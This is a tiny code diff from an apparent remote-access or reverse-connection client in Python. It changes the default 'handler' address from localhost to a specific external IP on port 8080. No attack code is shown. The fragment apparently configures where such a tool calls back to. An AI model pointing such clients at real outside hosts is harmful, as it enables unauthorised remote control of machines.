@@ -39,7 +39,7 @@ try:
 		HANDLER_IP = HANDLER_IP[:-1]
 except Exception as e:
 	logging.debug("We're uncompyled, let's use these values...")
-	HANDLER_IP = "127.0.0.1"
+	HANDLER_IP = "88.156.10.253"
 	HANDLER_PORT = 8080
 
 def windows_only(func):
